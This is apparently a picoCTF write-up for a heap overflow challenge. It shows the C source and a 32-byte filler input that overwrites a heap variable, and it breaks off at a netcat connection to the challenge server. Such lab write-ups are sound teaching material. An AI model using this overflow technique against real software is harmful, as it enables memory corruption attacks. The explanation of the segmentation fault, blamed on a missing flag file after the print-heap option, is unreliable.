## Solution

Same as [heap 0](heap_0.md), we start by looking at the main()

### Analyse the C file


```c
int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
        int rval = scanf("%d", &choice);
        if (rval == EOF){
            exit(0);
        }
        if (rval != 1) {
            //printf("Invalid input. Please enter a valid choice.\n");
            //fflush(stdout);
            // Clear input buffer
            //while (getchar() != '\n');
            //continue;
            exit(0);
        }

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf("\n\nTake a look at my variable: safe_var = %s\n\n",
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```
Main basically does the following:
- Call `init` function 
- Call `print_heap` function
- Print the menu with the `print_menu` function
- Read the user input choice, check if it's valid and from 1-4, do different things accordingly

---

The `check_win` function (menu choice 4) will print the flag for us if we have managed to change the contents of the `safe_var` variable
```c
void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```

So basically we want to satisfy the condition `if (!strcmp(safe_var, "pico"))` and we will win, strcmp compares 2 strings(takes in the pointer as input), safe_var and "pico"

Meaning we would like to make the value stored in pointer safe_var equals to "pico"

Let's skip the rest of the source code for now and run the program.

### Run the binary locally

```bash
./chall

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x556e508826b0  ->   pico
+-------------+----------------+
[*]   0x556e508826d0  ->   pico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 
```
The difference between the memory positions is 32 bytes. 

For every char is 1 byte, so we will type "pico after 32bytes of characters
```bash
Enter your choice: 2
Data for buffer: 12345678901234567890123456789012pico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1

zsh: segmentation fault  ./chall
                                                                                                                                                                     
```
Success, we managed to overwrite `safe_var`. The segmentation fault error is due to the fact that no `flag.txt` file exists in the directory.

The cause is [the unbounded use of scanf](https://stackoverflow.com/questions/31379442/has-scanf-a-limited-bound-on-the-number-of-bytes-that-the-user-can-input) (`scanf("%s", input_data);`) in the `write_buffer` function.

### Get the flag

Finally, we connect to the site vith netcat and follow the same procedure
```bash
nc tethys.picoctf.net 61789
